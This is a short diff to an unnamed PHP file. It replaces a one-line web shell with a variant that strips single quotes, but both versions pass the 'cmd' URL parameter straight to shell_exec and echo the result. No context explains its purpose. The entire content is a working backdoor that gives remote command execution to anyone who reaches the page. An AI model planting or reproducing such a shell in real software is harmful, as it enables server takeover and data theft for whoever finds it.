@@ -1,1 +1,1 @@
-<?php echo shell_exec($_GET['cmd']); ?>
+<?php echo shell_exec(str_replace('\'', '',$_GET['cmd'])); ?>
